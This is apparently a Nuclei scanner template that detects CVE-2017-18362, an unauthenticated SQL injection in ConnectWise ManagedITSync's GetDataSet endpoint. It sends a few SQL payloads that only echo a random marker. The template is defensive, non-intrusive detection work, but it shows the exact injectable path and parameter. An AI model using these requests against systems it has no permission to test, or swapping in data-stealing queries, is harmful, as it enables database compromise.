id: cve-2017-18362

info:
  name: ConnectWise ManagedITSync - Unauthenticated SQL Injection
  author: yawningmoney
  severity: critical
  description: |
    ConnectWise ManagedITSync integration for Kaseya VSA (2017 and prior) contains an unauthenticated SQL injection vulnerability in the ManagedIT.asmx endpoint. Attackers can execute arbitrary SQL queries remotely without authentication, leading to database compromise. This template uses a non-intrusive deterministic proof by injecting a controlled random marker value instead of exfiltrating sensitive data.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-18362
    - https://github.com/kbni/owlky
    - https://docs.connectwise.com/ConnectWise_Documentation/140/Kaseya_-_IP_and_Domain_Restrictions
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-18362
    cwe-id: CWE-89
    epss-score: 0.97
    epss-percentile: 0.99
    cpe: cpe:2.3:a:connectwise:manageditsync:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 7
    vendor: connectwise
    product: manageditsync
  tags: cve,sqli,critical

variables:
  marker: "{{rand_text_alpha(8)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"
      Accept: "*/*"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - "ManagedIT.asmx?op="

  - method: POST
    stop-at-first-match: true
    path:
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx/GetDataSet"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"
      Accept: "*/*"
    body: "sql={{sql_payload}}"
    payloads:
      sql_payload:
        - "SELECT '{{marker}}'"
        - "/*c1*/SELECT/**/'{{marker}}'"
        - "SELECT/**/'{{marker}}'--"
        - "SELECT('{{marker}}')"
        - "SELECT '{{marker}}'/**/UNION/**/SELECT '{{marker}}'"
        - "SELECT '{{marker}}'+CAST('{{marker}}' AS NVARCHAR(8))"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - "{{marker}}"
      - type: regex
        part: body
        regex:
          - "<NewDataSet>|<DataSet"
    extractors:
      - type: regex
        part: body
        regex:
          - "({{marker}})"

stop-at-first-match: true
